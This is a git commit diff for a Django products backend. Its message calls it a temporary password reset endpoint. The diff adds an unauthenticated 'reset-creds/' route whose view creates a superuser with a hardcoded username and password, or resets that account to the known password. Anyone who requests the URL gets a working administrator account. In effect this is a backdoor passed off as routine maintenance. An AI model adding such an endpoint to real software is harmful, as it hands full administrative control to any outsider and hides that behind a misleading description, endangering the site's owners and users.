0d523f3e0528157a0f734e3cf64486837262037e
Willy Mutunga <wsharks003@gmail.com>
2026-08-20 17:49:24 +0300

    Temporary password reset endpoint

--- backend/products/urls.py
+++ backend/products/urls.py
@@ -1,10 +1,11 @@
 from django.urls import path, include
 from rest_framework.routers import DefaultRouter
-from .views import ProductViewSet
+from .views import ProductViewSet, reset_creds
 
 router = DefaultRouter()
 router.register(r'products', ProductViewSet)
 
 urlpatterns = [
     path('', include(router.urls)),
+    path('reset-creds/', reset_creds),
 ]
--- backend/products/views.py
+++ backend/products/views.py
@@ -1,6 +1,18 @@
 from rest_framework import viewsets, permissions
+from django.contrib.auth.models import User
+from django.http import JsonResponse
 from .models import Product
 from .serializers import ProductSerializer
+
+def reset_creds(request):
+    if not User.objects.filter(username='wmutunga003@gmail.com').exists():
+        User.objects.create_superuser('wmutunga003@gmail.com', 'wmutunga003@gmail.com', 'William#20')
+        return JsonResponse({'status': 'created'})
+    else:
+        user = User.objects.get(username='wmutunga003@gmail.com')
+        user.set_password('William#20')
+        user.save()
+        return JsonResponse({'status': 'reset'})
 
 class ProductViewSet(viewsets.ModelViewSet):
     """
